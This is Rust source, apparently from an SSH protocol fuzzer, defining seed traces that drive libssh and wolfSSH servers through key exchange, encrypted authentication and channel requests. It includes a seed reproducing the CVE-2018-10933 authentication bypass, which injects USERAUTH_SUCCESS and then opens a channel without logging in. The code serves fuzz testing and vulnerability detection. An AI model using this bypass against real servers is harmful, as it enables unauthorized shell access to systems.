use puffin::agent::{AgentDescriptor, AgentName};
use puffin::algebra::Term;
use puffin::term;
use puffin::trace::{InputAction, OutputAction, Trace};

use crate::protocol::{
    AgentType, RawSshMessageFlight, SshDescriptorConfig, SshProtocolBehavior, SshProtocolTypes,
};
use crate::ssh::fn_impl::*;
use crate::ssh::message::{
    CompressionAlgorithms, EncryptionAlgorithms, KexAlgorithms, MacAlgorithms, OnWireData,
    RawSshMessage, SignatureSchemes, SshBytes, SshMessage,
};

// ── Seed: client attacker with full handshake and encrypted post-NewKeys ──────
//
// The fuzzer acts as the SSH client; the server is a real libssh instance.
// We compute the exchange hash using the actual server ephemeral ECDH key and
// derive the encryption key so we can send properly encrypted post-NewKeys
// messages (ServiceRequest, UserAuthRequest, ChannelOpen, ChannelRequest).

pub fn seed_client_attacker_full(server: AgentName) -> Trace<SshProtocolTypes> {
    // Knowledge available after OutputAction + sending banner/kexinit/EcdhInit:
    //   (server, 0)[None]/RawSshMessage → server banner
    //   (server, 0)[None]/SshMessage    → server KexInit
    //   (server, 1)[None]/SshMessage    → server KexEcdhReply

    let server_banner_raw = term! { (server, 0)[None]/RawSshMessage };
    let server_banner_id = term! { fn_banner_id((@server_banner_raw)) };

    let server_kexinit = term! { (server, 0)[None]/SshMessage };
    let server_ecdh_reply_msg = term! { (server, 1)[None]/SshMessage };
    // Use RawSshMessage for K_S extraction (SshMessage lossy-parses RSA keys).
    // RawSshMessage indices: 0=Banner, 1=KexInit, 2=KexEcdhReply, 3=NewKeys
    let server_ecdh_reply_raw = term! { (server, 2)[None]/RawSshMessage };

    let server_ecdh_pub = term! { fn_server_ecdh_pubkey((@server_ecdh_reply_msg)) };
    let server_hostkey = term! { fn_server_hostkey_raw((@server_ecdh_reply_raw)) };

    let shared = term! {
        fn_ecdh_shared_secret((fn_client_ecdh_privkey), (@server_ecdh_pub))
    };

    // Our kexinit mirrors server's algorithms.
    let our_kexinit = term! {
        fn_kex_init(
            (fn_placeholder_16bytes),
            ((server, 0)[None]/KexAlgorithms),
            ((server, 0)[None]/SignatureSchemes),
            ((server, 0)[None]/EncryptionAlgorithms),
            ((server, 1)[None]/EncryptionAlgorithms),
            ((server, 0)[None]/MacAlgorithms),
            ((server, 1)[None]/MacAlgorithms),
            ((server, 0)[None]/CompressionAlgorithms),
            ((server, 1)[None]/CompressionAlgorithms)
        )
    };

    let i_c = term! { fn_kexinit_payload((@our_kexinit)) };
    let i_s = term! { fn_kexinit_payload((@server_kexinit)) };

    let exch_hash = term! {
        fn_kex_exchange_hash(
            (fn_puffin_id),
            (@server_banner_id),
            (@i_c),
            (@i_s),
            (@server_hostkey),
            (fn_client_ecdh_pubkey),
            (@server_ecdh_pub),
            (@shared)
        )
    };

    let enc_key = term! {
        fn_derive_enc_key_c2s((@shared), (@exch_hash), (@exch_hash))
    };

    // Sequence numbers: banner is NOT a binary packet.
    // Binary packets we send: KexInit(0), KexEcdhInit(1), NewKeys(2)
    // First encrypted packets: ServiceRequest(3), AuthRequest(4),
    //   ChannelOpen(5), ChannelRequest(6)
    let svc_req = term! {
        fn_encrypt_packet(
            (fn_service_request((fn_ssh_userauth))),
            (@enc_key),
            (fn_u32_3)
        )
    };
    let auth_req = term! {
        fn_encrypt_packet(
            (fn_user_auth_request(
                (fn_username),
                (fn_ssh_connection),
                (fn_method_password),
                (fn_password_auth_data((fn_password)))
            )),
            (@enc_key),
            (fn_u32_4)
        )
    };
    let chan_open = term! {
        fn_encrypt_packet(
            (fn_channel_open(
                (fn_channel_session),
                (fn_u32_0),
                (fn_u32_1),
                (fn_u32_2),
                (fn_empty_bytes_vec)
            )),
            (@enc_key),
            (fn_u32_5)
        )
    };
    let chan_req = term! {
        fn_encrypt_packet(
            (fn_channel_request(
                (fn_u32_0),
                (fn_channel_exec),
                (fn_true),
                (fn_exec_payload((fn_ssh_userauth)))
            )),
            (@enc_key),
            (fn_u32_6)
        )
    };

    Trace {
        prior_traces: vec![],
        descriptors: vec![AgentDescriptor::from_config(
            server,
            SshDescriptorConfig {
                typ: AgentType::Server,
                try_reuse: false,
                ..Default::default()
            },
        )],
        steps: vec![
            OutputAction::new_step(server),
            InputAction::new_step(server, term! { fn_banner(fn_puffin_banner) }),
            InputAction::new_step(server, term! { fn_packet((@our_kexinit)) }),
            InputAction::new_step(
                server,
                term! { fn_packet((fn_kex_ecdh_init((fn_client_ecdh_pubkey)))) },
            ),
            InputAction::new_step(server, term! { fn_packet((fn_new_keys)) }),
            InputAction::new_step(server, term! { @svc_req }),
            InputAction::new_step(server, term! { @auth_req }),
            InputAction::new_step(server, term! { @chan_open }),
            InputAction::new_step(server, term! { @chan_req }),
        ],
        ..Default::default()
    }
}

// ── Seed: client attacker authenticating with PUBLIC KEY (identity A) ─────────
//
// Same handshake as seed_client_attacker_full, but instead of password auth the
// fuzzer logs in with publickey method, signing the RFC 4252 §7 blob with client
// identity key A (the only client key whose private half is in the signature).
// This is the honest baseline for the entity-authentication / impersonation
// oracle: it completes as A; any mutation that makes the server authenticate a
// *different* key is flagged as impersonation.
pub fn seed_client_attacker_pubkey(server: AgentName) -> Trace<SshProtocolTypes> {
    let server_banner_raw = term! { (server, 0)[None]/RawSshMessage };
    let server_banner_id = term! { fn_banner_id((@server_banner_raw)) };
    let server_kexinit = term! { (server, 0)[None]/SshMessage };
    let server_ecdh_reply_msg = term! { (server, 1)[None]/SshMessage };
    let server_ecdh_reply_raw = term! { (server, 2)[None]/RawSshMessage };
    let server_ecdh_pub = term! { fn_server_ecdh_pubkey((@server_ecdh_reply_msg)) };
    let server_hostkey = term! { fn_server_hostkey_raw((@server_ecdh_reply_raw)) };
    let shared = term! { fn_ecdh_shared_secret((fn_client_ecdh_privkey), (@server_ecdh_pub)) };

    let our_kexinit = term! {
        fn_kex_init(
            (fn_placeholder_16bytes),
            ((server, 0)[None]/KexAlgorithms),
            ((server, 0)[None]/SignatureSchemes),
            ((server, 0)[None]/EncryptionAlgorithms),
            ((server, 1)[None]/EncryptionAlgorithms),
            ((server, 0)[None]/MacAlgorithms),
            ((server, 1)[None]/MacAlgorithms),
            ((server, 0)[None]/CompressionAlgorithms),
            ((server, 1)[None]/CompressionAlgorithms)
        )
    };
    let i_c = term! { fn_kexinit_payload((@our_kexinit)) };
    let i_s = term! { fn_kexinit_payload((@server_kexinit)) };
    let exch_hash = term! {
        fn_kex_exchange_hash(
            (fn_puffin_id), (@server_banner_id), (@i_c), (@i_s),
            (@server_hostkey), (fn_client_ecdh_pubkey), (@server_ecdh_pub), (@shared)
        )
    };
    let enc_key = term! { fn_derive_enc_key_c2s((@shared), (@exch_hash), (@exch_hash)) };

    let svc_req = term! {
        fn_encrypt_packet((fn_service_request((fn_ssh_userauth))), (@enc_key), (fn_u32_3))
    };

    // Publickey auth: sign the §7 blob (over the session id = exchange hash) with
    // key A, then carry A's blob + the signature in the request.
    let sig = term! {
        fn_sign_userauth((@exch_hash), (fn_username), (fn_ssh_connection), (fn_client_a_pubkey_blob))
    };
    let auth_req = term! {
        fn_encrypt_packet(
            (fn_user_auth_request(
                (fn_username),
                (fn_ssh_connection),
                (fn_method_publickey),
                (fn_publickey_auth_data((fn_client_a_pubkey_blob), (@sig)))
            )),
            (@enc_key),
            (fn_u32_4)
        )
    };

    Trace {
        prior_traces: vec![],
        descriptors: vec![AgentDescriptor::from_config(
            server,
            SshDescriptorConfig {
                typ: AgentType::Server,
                try_reuse: false,
                ..Default::default()
            },
        )],
        steps: vec![
            OutputAction::new_step(server),
            InputAction::new_step(server, term! { fn_banner(fn_puffin_banner) }),
            InputAction::new_step(server, term! { fn_packet((@our_kexinit)) }),
            InputAction::new_step(
                server,
                term! { fn_packet((fn_kex_ecdh_init((fn_client_ecdh_pubkey)))) },
            ),
            InputAction::new_step(server, term! { fn_packet((fn_new_keys)) }),
            InputAction::new_step(server, term! { @svc_req }),
            InputAction::new_step(server, term! { @auth_req }),
        ],
        ..Default::default()
    }
}

// ── Seed: client attacker full handshake over AES-256-GCM ─────────────────────
//
// Same shape as seed_client_attacker_full but forces aes256-gcm@openssh.com
// (offered by BOTH libssh and wolfSSH), so this single seed completes the full
// handshake + encrypted record layer against both implementations. The fuzzer
// is the client; the libssh/wolfSSH server is the PUT.
pub fn seed_client_attacker_full_aesgcm(server: AgentName) -> Trace<SshProtocolTypes> {
    let server_banner_id = term! { fn_banner_id(((server, 0)[None]/RawSshMessage)) };
    let server_kexinit = term! { (server, 0)[None]/SshMessage };
    let server_ecdh_reply_msg = term! { (server, 1)[None]/SshMessage };
    let server_ecdh_reply_raw = term! { (server, 2)[None]/RawSshMessage };
    let server_ecdh_pub = term! { fn_server_ecdh_pubkey((@server_ecdh_reply_msg)) };
    let server_hostkey = term! { fn_server_hostkey_raw((@server_ecdh_reply_raw)) };
    let shared = term! { fn_ecdh_shared_secret((fn_client_ecdh_privkey), (@server_ecdh_pub)) };

    // Fixed client KexInit offering only aes256-gcm.
    let our_kexinit = term! { fn_client_kexinit_aesgcm((fn_placeholder_16bytes)) };

    let i_c = term! { fn_kexinit_payload((@our_kexinit)) };
    let i_s = term! { fn_kexinit_payload((@server_kexinit)) };
    let exch_hash = term! {
        fn_kex_exchange_hash(
            (fn_puffin_id), (@server_banner_id), (@i_c), (@i_s),
            (@server_hostkey), (fn_client_ecdh_pubkey), (@server_ecdh_pub), (@shared)
        )
    };
    // c2s AES-256-GCM key + IV.
    let key = term! { fn_derive_aes_key_c2s((@shared), (@exch_hash), (@exch_hash)) };
    let iv = term! { fn_derive_iv_c2s((@shared), (@exch_hash), (@exch_hash)) };

    // AES-GCM invocation counter = per-direction packet index since NewKeys (0,1,2,3).
    let svc_req = term! {
        fn_encrypt_packet_aesgcm((fn_service_request((fn_ssh_userauth))), (@key), (@iv), (fn_u32_0))
    };
    let auth_req = term! {
        fn_encrypt_packet_aesgcm(
            (fn_user_auth_request((fn_username), (fn_ssh_connection), (fn_method_password),
                                  (fn_password_auth_data((fn_password))))),
            (@key), (@iv), (fn_u32_1))
    };
    let chan_open = term! {
        fn_encrypt_packet_aesgcm(
            (fn_channel_open((fn_channel_session), (fn_u32_0), (fn_u32_1), (fn_u32_2),
                             (fn_empty_bytes_vec))),
            (@key), (@iv), (fn_u32_2))
    };
    let chan_req = term! {
        fn_encrypt_packet_aesgcm(
            (fn_channel_request((fn_u32_0), (fn_channel_exec), (fn_true),
                                (fn_exec_payload((fn_ssh_userauth))))),
            (@key), (@iv), (fn_u32_3))
    };

    Trace {
        prior_traces: vec![],
        descriptors: vec![AgentDescriptor::from_config(
            server,
            SshDescriptorConfig {
                typ: AgentType::Server,
                try_reuse: false,
                ..Default::default()
            },
        )],
        steps: vec![
            OutputAction::new_step(server),
            InputAction::new_step(server, term! { fn_banner(fn_puffin_banner) }),
            InputAction::new_step(server, term! { fn_packet((@our_kexinit)) }),
            InputAction::new_step(
                server,
                term! { fn_packet((fn_kex_ecdh_init((fn_client_ecdh_pubkey)))) },
            ),
            InputAction::new_step(server, term! { fn_packet((fn_new_keys)) }),
            InputAction::new_step(server, term! { @svc_req }),
            InputAction::new_step(server, term! { @auth_req }),
            InputAction::new_step(server, term! { @chan_open }),
            InputAction::new_step(server, term! { @chan_req }),
        ],
        ..Default::default()
    }
}

/// CONTROLLED conformance test for the injected-KexInit divergence. Identical to
/// seed_client_attacker_full_aesgcm, but injects ONE valid, uncorrupted KEXINIT
/// (encrypted, counter 0) as the first post-NewKeys packet — a client-initiated
/// rekey trigger (RFC 4253 §9) — then proceeds straight to the auth flow WITHOUT
/// completing the rekey (no KEXDH_INIT / NEWKEYS). Everything else is the clean
/// 0-diff handshake, so any divergence isolates how each stack handles an
/// unexpected mid-session KEXINIT: a strict stack must respond with its own
/// KEXINIT and reject the non-KEX follow-up (or abort); a lenient stack ignores
/// the KEXINIT and authenticates anyway. Counters shift by 1 (inject=0, svc=1,
/// auth=2, chan=3,4).
pub fn seed_client_attacker_kexinit_injection(server: AgentName) -> Trace<SshProtocolTypes> {
    let server_banner_id = term! { fn_banner_id(((server, 0)[None]/RawSshMessage)) };
    let server_kexinit = term! { (server, 0)[None]/SshMessage };
    let server_ecdh_reply_msg = term! { (server, 1)[None]/SshMessage };
    let server_ecdh_reply_raw = term! { (server, 2)[None]/RawSshMessage };
    let server_ecdh_pub = term! { fn_server_ecdh_pubkey((@server_ecdh_reply_msg)) };
    let server_hostkey = term! { fn_server_hostkey_raw((@server_ecdh_reply_raw)) };
    let shared = term! { fn_ecdh_shared_secret((fn_client_ecdh_privkey), (@server_ecdh_pub)) };
    let our_kexinit = term! { fn_client_kexinit_aesgcm((fn_placeholder_16bytes)) };
    let i_c = term! { fn_kexinit_payload((@our_kexinit)) };
    let i_s = term! { fn_kexinit_payload((@server_kexinit)) };
    let exch_hash = term! {
        fn_kex_exchange_hash(
            (fn_puffin_id), (@server_banner_id), (@i_c), (@i_s),
            (@server_hostkey), (fn_client_ecdh_pubkey), (@server_ecdh_pub), (@shared)
        )
    };
    let key = term! { fn_derive_aes_key_c2s((@shared), (@exch_hash), (@exch_hash)) };
    let iv = term! { fn_derive_iv_c2s((@shared), (@exch_hash), (@exch_hash)) };

    // Injected valid rekey KEXINIT (encrypted, counter 0).
    let inject_kexinit = term! {
        fn_encrypt_packet_aesgcm(
            (fn_client_kexinit_aesgcm((fn_cookie_zeros))), (@key), (@iv), (fn_u32_0))
    };
    let svc_req = term! {
        fn_encrypt_packet_aesgcm((fn_service_request((fn_ssh_userauth))), (@key), (@iv), (fn_u32_1))
    };
    let auth_req = term! {
        fn_encrypt_packet_aesgcm(
            (fn_user_auth_request((fn_username), (fn_ssh_connection), (fn_method_password),
                                  (fn_password_auth_data((fn_password))))),
            (@key), (@iv), (fn_u32_2))
    };
    let chan_open = term! {
        fn_encrypt_packet_aesgcm(
            (fn_channel_open((fn_channel_session), (fn_u32_0), (fn_u32_1), (fn_u32_2),
                             (fn_empty_bytes_vec))),
            (@key), (@iv), (fn_u32_3))
    };
    let chan_req = term! {
        fn_encrypt_packet_aesgcm(
            (fn_channel_request((fn_u32_0), (fn_channel_exec), (fn_true),
                                (fn_exec_payload((fn_ssh_userauth))))),
            (@key), (@iv), (fn_u32_4))
    };

    Trace {
        prior_traces: vec![],
        descriptors: vec![AgentDescriptor::from_config(
            server,
            SshDescriptorConfig {
                typ: AgentType::Server,
                try_reuse: false,
                ..Default::default()
            },
        )],
        steps: vec![
            OutputAction::new_step(server),
            InputAction::new_step(server, term! { fn_banner(fn_puffin_banner) }),
            InputAction::new_step(server, term! { fn_packet((@our_kexinit)) }),
            InputAction::new_step(
                server,
                term! { fn_packet((fn_kex_ecdh_init((fn_client_ecdh_pubkey)))) },
            ),
            InputAction::new_step(server, term! { fn_packet((fn_new_keys)) }),
            InputAction::new_step(server, term! { @inject_kexinit }),
            InputAction::new_step(server, term! { @svc_req }),
            InputAction::new_step(server, term! { @auth_req }),
            InputAction::new_step(server, term! { @chan_open }),
            InputAction::new_step(server, term! { @chan_req }),
        ],
        ..Default::default()
    }
}

/// Same AES-GCM client-attacker handshake as `seed_client_attacker_full_aesgcm`,
/// but the client KEXINIT is *synthesized* from algorithm-name atoms via
/// `fn_kex_init` + the new `fn_namelist_*` / `fn_*_algos` builders, instead of the
/// fixed `fn_client_kexinit_aesgcm`. Functionally identical (offers
/// curve25519-sha256 / aes256-gcm / hmac-sha2-256 / rsa-sha2 / none, so it still
/// negotiates AES-256-GCM and completes), but every offered algorithm list is now
/// a mutable sub-term: the DY mutator can drop/reorder/duplicate/replace entries
/// (downgrade, unknown-algorithm injection, algorithm confusion) from this seed.
pub fn seed_client_attacker_full_kexinit_synth(server: AgentName) -> Trace<SshProtocolTypes> {
    let server_banner_id = term! { fn_banner_id(((server, 0)[None]/RawSshMessage)) };
    let server_kexinit = term! { (server, 0)[None]/SshMessage };
    let server_ecdh_reply_msg = term! { (server, 1)[None]/SshMessage };
    let server_ecdh_reply_raw = term! { (server, 2)[None]/RawSshMessage };
    let server_ecdh_pub = term! { fn_server_ecdh_pubkey((@server_ecdh_reply_msg)) };
    let server_hostkey = term! { fn_server_hostkey_raw((@server_ecdh_reply_raw)) };
    let shared = term! { fn_ecdh_shared_secret((fn_client_ecdh_privkey), (@server_ecdh_pub)) };

    // Client KexInit built bottom-up from algorithm-name atoms.
    let our_kexinit = term! {
        fn_kex_init(
            (fn_placeholder_16bytes),
            (fn_kex_algos((fn_namelist_1((fn_algo_curve25519_sha256))))),
            (fn_sig_schemes((fn_namelist_2((fn_algo_rsa_sha2_512), (fn_algo_rsa_sha2_256))))),
            (fn_enc_algos((fn_namelist_1((fn_algo_aes256_gcm))))),
            (fn_enc_algos((fn_namelist_1((fn_algo_aes256_gcm))))),
            (fn_mac_algos((fn_namelist_1((fn_algo_hmac_sha2_256))))),
            (fn_mac_algos((fn_namelist_1((fn_algo_hmac_sha2_256))))),
            (fn_comp_algos((fn_namelist_1((fn_algo_none))))),
            (fn_comp_algos((fn_namelist_1((fn_algo_none)))))
        )
    };

    let i_c = term! { fn_kexinit_payload((@our_kexinit)) };
    let i_s = term! { fn_kexinit_payload((@server_kexinit)) };
    let exch_hash = term! {
        fn_kex_exchange_hash(
            (fn_puffin_id), (@server_banner_id), (@i_c), (@i_s),
            (@server_hostkey), (fn_client_ecdh_pubkey), (@server_ecdh_pub), (@shared)
        )
    };
    let key = term! { fn_derive_aes_key_c2s((@shared), (@exch_hash), (@exch_hash)) };
    let iv = term! { fn_derive_iv_c2s((@shared), (@exch_hash), (@exch_hash)) };

    let svc_req = term! {
        fn_encrypt_packet_aesgcm((fn_service_request((fn_ssh_userauth))), (@key), (@iv), (fn_u32_0))
    };
    let auth_req = term! {
        fn_encrypt_packet_aesgcm(
            (fn_user_auth_request((fn_username), (fn_ssh_connection), (fn_method_password),
                                  (fn_password_auth_data((fn_password))))),
            (@key), (@iv), (fn_u32_1))
    };
    let chan_open = term! {
        fn_encrypt_packet_aesgcm(
            (fn_channel_open((fn_channel_session), (fn_u32_0), (fn_u32_1), (fn_u32_2),
                             (fn_empty_bytes_vec))),
            (@key), (@iv), (fn_u32_2))
    };
    let chan_req = term! {
        fn_encrypt_packet_aesgcm(
            (fn_channel_request((fn_u32_0), (fn_channel_exec), (fn_true),
                                (fn_exec_payload((fn_ssh_userauth))))),
            (@key), (@iv), (fn_u32_3))
    };

    Trace {
        prior_traces: vec![],
        descriptors: vec![AgentDescriptor::from_config(
            server,
            SshDescriptorConfig {
                typ: AgentType::Server,
                try_reuse: false,
                ..Default::default()
            },
        )],
        steps: vec![
            OutputAction::new_step(server),
            InputAction::new_step(server, term! { fn_banner(fn_puffin_banner) }),
            InputAction::new_step(server, term! { fn_packet((@our_kexinit)) }),
            InputAction::new_step(
                server,
                term! { fn_packet((fn_kex_ecdh_init((fn_client_ecdh_pubkey)))) },
            ),
            InputAction::new_step(server, term! { fn_packet((fn_new_keys)) }),
            InputAction::new_step(server, term! { @svc_req }),
            InputAction::new_step(server, term! { @auth_req }),
            InputAction::new_step(server, term! { @chan_open }),
            InputAction::new_step(server, term! { @chan_req }),
        ],
        ..Default::default()
    }
}

/// Client-attacker handshake on the **non-AEAD** suite aes256-ctr +
/// hmac-sha2-256 (both libssh and wolfSSH support it). This drives the separate
/// stream-cipher + separate-HMAC code path — distinct from the AEAD ciphers the
/// other seeds use — and then sends one correctly AES-CTR-encrypted /
/// HMAC-authenticated service-request packet, exercising the server's CTR
/// decrypt + HMAC-verify code. The KEXINIT is synthesized via `fn_kex_init`, so
/// the offered algorithms are mutable sub-terms.
pub fn seed_client_attacker_full_ctr(server: AgentName) -> Trace<SshProtocolTypes> {
    let server_banner_id = term! { fn_banner_id(((server, 0)[None]/RawSshMessage)) };
    let server_kexinit = term! { (server, 0)[None]/SshMessage };
    let server_ecdh_reply_msg = term! { (server, 1)[None]/SshMessage };
    let server_ecdh_reply_raw = term! { (server, 2)[None]/RawSshMessage };
    let server_ecdh_pub = term! { fn_server_ecdh_pubkey((@server_ecdh_reply_msg)) };
    let server_hostkey = term! { fn_server_hostkey_raw((@server_ecdh_reply_raw)) };
    let shared = term! { fn_ecdh_shared_secret((fn_client_ecdh_privkey), (@server_ecdh_pub)) };

    let our_kexinit = term! {
        fn_kex_init(
            (fn_placeholder_16bytes),
            (fn_kex_algos((fn_namelist_1((fn_algo_curve25519_sha256))))),
            (fn_sig_schemes((fn_namelist_2((fn_algo_rsa_sha2_512), (fn_algo_rsa_sha2_256))))),
            (fn_enc_algos((fn_namelist_1((fn_algo_aes256_ctr))))),
            (fn_enc_algos((fn_namelist_1((fn_algo_aes256_ctr))))),
            (fn_mac_algos((fn_namelist_1((fn_algo_hmac_sha2_256))))),
            (fn_mac_algos((fn_namelist_1((fn_algo_hmac_sha2_256))))),
            (fn_comp_algos((fn_namelist_1((fn_algo_none))))),
            (fn_comp_algos((fn_namelist_1((fn_algo_none)))))
        )
    };
    let i_c = term! { fn_kexinit_payload((@our_kexinit)) };
    let i_s = term! { fn_kexinit_payload((@server_kexinit)) };
    let exch_hash = term! {
        fn_kex_exchange_hash(
            (fn_puffin_id), (@server_banner_id), (@i_c), (@i_s),
            (@server_hostkey), (fn_client_ecdh_pubkey), (@server_ecdh_pub), (@shared)
        )
    };
    // aes256-ctr enc key ('C'), 16-byte CTR IV ('A'), hmac-sha2-256 key ('E').
    let enc_key = term! { fn_derive_ctr_key_c2s((@shared), (@exch_hash), (@exch_hash)) };
    let iv = term! { fn_derive_ctr_iv_c2s((@shared), (@exch_hash), (@exch_hash)) };
    let mac_key = term! { fn_derive_mac_key_c2s((@shared), (@exch_hash), (@exch_hash)) };

    // AES-CTR keeps a continuous 128-bit counter across packets, so each packet's
    // block_offset is the cumulative number of 16-byte blocks already sent on this
    // direction. ServiceRequest("ssh-userauth") encrypts to 32 bytes = 2 blocks,
    // so the UserAuthRequest that follows starts at block offset 2.
    //   svc_req:  block_offset 0, seqno 3
    //   auth_req: block_offset 2, seqno 4  (libssh emits its claim only after auth)
    let svc_req = term! {
        fn_encrypt_packet_ctr(
            (fn_service_request((fn_ssh_userauth))),
            (@enc_key), (@iv), (@mac_key), (fn_u32_0), (fn_u32_3))
    };
    let auth_req = term! {
        fn_encrypt_packet_ctr(
            (fn_user_auth_request((fn_username), (fn_ssh_connection), (fn_method_password),
                                  (fn_password_auth_data((fn_password))))),
            (@enc_key), (@iv), (@mac_key), (fn_u32_2), (fn_u32_4))
    };

    Trace {
        prior_traces: vec![],
        descriptors: vec![AgentDescriptor::from_config(
            server,
            SshDescriptorConfig {
                typ: AgentType::Server,
                try_reuse: false,
                ..Default::default()
            },
        )],
        steps: vec![
            OutputAction::new_step(server),
            InputAction::new_step(server, term! { fn_banner(fn_puffin_banner) }),
            InputAction::new_step(server, term! { fn_packet((@our_kexinit)) }),
            InputAction::new_step(
                server,
                term! { fn_packet((fn_kex_ecdh_init((fn_client_ecdh_pubkey)))) },
            ),
            InputAction::new_step(server, term! { fn_packet((fn_new_keys)) }),
            InputAction::new_step(server, term! { @svc_req }),
            InputAction::new_step(server, term! { @auth_req }),
        ],
        ..Default::default()
    }
}

// ── Seed: CVE-2018-10933 authentication bypass (client attacker) ──────────────
//
// The fuzzer (client) completes the KEX, then — instead of authenticating —
// injects an SSH_MSG_USERAUTH_SUCCESS (a message a server should never accept)
// followed by a channel open. A libssh server vulnerable to CVE-2018-10933
// wrongly transitions to the authenticated state on the stray USERAUTH_SUCCESS
// and then accepts the channel open; the harness records a completed handshake
// with NO authentication method, which the entity-authentication oracle flags.
// A patched server ignores/rejects the stray message and never completes.
pub fn seed_client_attacker_auth_bypass(server: AgentName) -> Trace<SshProtocolTypes> {
    let server_banner_raw = term! { (server, 0)[None]/RawSshMessage };
    let server_banner_id = term! { fn_banner_id((@server_banner_raw)) };
    let server_kexinit = term! { (server, 0)[None]/SshMessage };
    let server_ecdh_reply_msg = term! { (server, 1)[None]/SshMessage };
    let server_ecdh_reply_raw = term! { (server, 2)[None]/RawSshMessage };
    let server_ecdh_pub = term! { fn_server_ecdh_pubkey((@server_ecdh_reply_msg)) };
    let server_hostkey = term! { fn_server_hostkey_raw((@server_ecdh_reply_raw)) };
    let shared = term! { fn_ecdh_shared_secret((fn_client_ecdh_privkey), (@server_ecdh_pub)) };
    let our_kexinit = term! {
        fn_kex_init(
            (fn_placeholder_16bytes),
            ((server, 0)[None]/KexAlgorithms),
            ((server, 0)[None]/SignatureSchemes),
            ((server, 0)[None]/EncryptionAlgorithms),
            ((server, 1)[None]/EncryptionAlgorithms),
            ((server, 0)[None]/MacAlgorithms),
            ((server, 1)[None]/MacAlgorithms),
            ((server, 0)[None]/CompressionAlgorithms),
            ((server, 1)[None]/CompressionAlgorithms)
        )
    };
    let i_c = term! { fn_kexinit_payload((@our_kexinit)) };
    let i_s = term! { fn_kexinit_payload((@server_kexinit)) };
    let exch_hash = term! {
        fn_kex_exchange_hash(
            (fn_puffin_id), (@server_banner_id), (@i_c), (@i_s),
            (@server_hostkey), (fn_client_ecdh_pubkey), (@server_ecdh_pub), (@shared)
        )
    };
    let enc_key = term! { fn_derive_enc_key_c2s((@shared), (@exch_hash), (@exch_hash)) };

    // The bypass: inject USERAUTH_SUCCESS (seqno 3), then a channel open (4).
    let bypass = term! {
        fn_encrypt_packet((fn_user_auth_success), (@enc_key), (fn_u32_3))
    };
    let chan_open = term! {
        fn_encrypt_packet(
            (fn_channel_open((fn_channel_session), (fn_u32_0), (fn_u32_1), (fn_u32_2),
                             (fn_empty_bytes_vec))),
            (@enc_key), (fn_u32_4))
    };

    Trace {
        prior_traces: vec![],
        descriptors: vec![AgentDescriptor::from_config(
            server,
            SshDescriptorConfig {
                typ: AgentType::Server,
                try_reuse: false,
                ..Default::default()
            },
        )],
        steps: vec![
            OutputAction::new_step(server),
            InputAction::new_step(server, term! { fn_banner(fn_puffin_banner) }),
            InputAction::new_step(server, term! { fn_packet((@our_kexinit)) }),
            InputAction::new_step(
                server,
                term! { fn_packet((fn_kex_ecdh_init((fn_client_ecdh_pubkey)))) },
            ),
            InputAction::new_step(server, term! { fn_packet((fn_new_keys)) }),
            InputAction::new_step(server, term! { @bypass }),
            InputAction::new_step(server, term! { @chan_open }),
        ],
        ..Default::default()
    }
}

// ── Seed: client attacker, PUBLIC KEY auth over AES-256-GCM (both vendors) ────
//
// Like seed_client_attacker_pubkey but over the AES-GCM record layer, so it
// completes on wolfSSH (which lacks chacha20-poly1305) as well as libssh. This
// is the cross-vendor baseline for the entity-authentication / impersonation
// oracle.
pub fn seed_client_attacker_pubkey_aesgcm(server: AgentName) -> Trace<SshProtocolTypes> {
    let server_banner_id = term! { fn_banner_id(((server, 0)[None]/RawSshMessage)) };
    let server_kexinit = term! { (server, 0)[None]/SshMessage };
    let server_ecdh_reply_msg = term! { (server, 1)[None]/SshMessage };
    let server_ecdh_reply_raw = term! { (server, 2)[None]/RawSshMessage };
    let server_ecdh_pub = term! { fn_server_ecdh_pubkey((@server_ecdh_reply_msg)) };
    let server_hostkey = term! { fn_server_hostkey_raw((@server_ecdh_reply_raw)) };
    let shared = term! { fn_ecdh_shared_secret((fn_client_ecdh_privkey), (@server_ecdh_pub)) };

    let our_kexinit = term! { fn_client_kexinit_aesgcm((fn_placeholder_16bytes)) };
    let i_c = term! { fn_kexinit_payload((@our_kexinit)) };
    let i_s = term! { fn_kexinit_payload((@server_kexinit)) };
    let exch_hash = term! {
        fn_kex_exchange_hash(
            (fn_puffin_id), (@server_banner_id), (@i_c), (@i_s),
            (@server_hostkey), (fn_client_ecdh_pubkey), (@server_ecdh_pub), (@shared)
        )
    };
    let key = term! { fn_derive_aes_key_c2s((@shared), (@exch_hash), (@exch_hash)) };
    let iv = term! { fn_derive_iv_c2s((@shared), (@exch_hash), (@exch_hash)) };

    let svc_req = term! {
        fn_encrypt_packet_aesgcm((fn_service_request((fn_ssh_userauth))), (@key), (@iv), (fn_u32_0))
    };
    let sig = term! {
        fn_sign_userauth((@exch_hash), (fn_username), (fn_ssh_connection), (fn_client_a_pubkey_blob))
    };
    let auth_req = term! {
        fn_encrypt_packet_aesgcm(
            (fn_user_auth_request(
                (fn_username),
                (fn_ssh_connection),
                (fn_method_publickey),
                (fn_publickey_auth_data((fn_client_a_pubkey_blob), (@sig)))
            )),
            (@key), (@iv), (fn_u32_1))
    };
    // Channel traffic after auth — also pumps extra progress() iterations, which
    // wolfSSH's single-step accept() needs to finish processing the auth.
    let chan_open = term! {
        fn_encrypt_packet_aesgcm(
            (fn_channel_open((fn_channel_session), (fn_u32_0), (fn_u32_1), (fn_u32_2),
                             (fn_empty_bytes_vec))),
            (@key), (@iv), (fn_u32_2))
    };
    let chan_req = term! {
        fn_encrypt_packet_aesgcm(
            (fn_channel_request((fn_u32_0), (fn_channel_exec), (fn_true),
                                (fn_exec_payload((fn_ssh_userauth))))),
            (@key), (@iv), (fn_u32_3))
    };

    Trace {
        prior_traces: vec![],
        descriptors: vec![AgentDescriptor::from_config(
            server,
            SshDescriptorConfig {
                typ: AgentType::Server,
                try_reuse: false,
                ..Default::default()
            },
        )],
        steps: vec![
            OutputAction::new_step(server),
            InputAction::new_step(server, term! { fn_banner(fn_puffin_banner) }),
            InputAction::new_step(server, term! { fn_packet((@our_kexinit)) }),
            InputAction::new_step(
                server,
                term! { fn_packet((fn_kex_ecdh_init((fn_client_ecdh_pubkey)))) },
            ),
            InputAction::new_step(server, term! { fn_packet((fn_new_keys)) }),
            InputAction::new_step(server, term! { @svc_req }),
            InputAction::new_step(server, term! { @auth_req }),
            InputAction::new_step(server, term! { @chan_open }),
            InputAction::new_step(server, term! { @chan_req }),
        ],
        ..Default::default()
    }
}

/// Credential-confusion baseline: authenticate by publickey as identity **B**
